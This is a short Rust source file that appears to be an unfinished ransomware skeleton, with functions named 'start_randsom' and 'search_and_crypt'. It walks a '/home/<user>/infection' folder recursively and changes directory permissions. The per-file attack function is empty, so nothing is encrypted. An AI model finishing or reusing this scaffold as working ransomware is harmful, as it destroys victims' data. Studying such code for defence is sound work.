use std::path::Path;
use whoami;
use std::fs::{self, DirEntry};
use std::os::unix::fs::PermissionsExt;

fn get_username() -> String {
    let user = whoami::username();
    user
}

pub fn get_path() -> String {
    let user = get_username();
    format!("/home/{}/infection", user)
}

pub fn start_randsom() -> Result<(), Box<dyn std::error::Error>> {
    let path = get_path();
    let dir = Path::new(&path);
    return search_and_crypt(dir);
}

fn atk_process(entry: &DirEntry) {
    
}

fn search_and_crypt(dir: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if dir.is_dir() {
        let mut perms = fs::metadata(dir)?.permissions();
        perms.set_mode(0o666);
        fs::set_permissions(dir, perms)?;
            for entry in fs::read_dir(dir)? {
                let entry = entry?;
                let path = entry.path();
                if path.is_dir() {
                    search_and_crypt(&path)?;
                } else {
                    atk_process(&entry);
                }
            }
    } else {
        println!("ca marche");
    }
    Ok(())
}

// fn visit_dirs(dir: &Path) -> io::Result<()> {
//     if dir.is_dir() {
//         for entry in fs::read_dir(dir)? {
//             let entry = entry?;
//             let path = entry.path();
//             if path.is_dir() {
//                 visit_dirs(&path)?;
//             } else {
//                 ma_fonction(&entry);
//             }
//         }
//     }
//     Ok(())
// }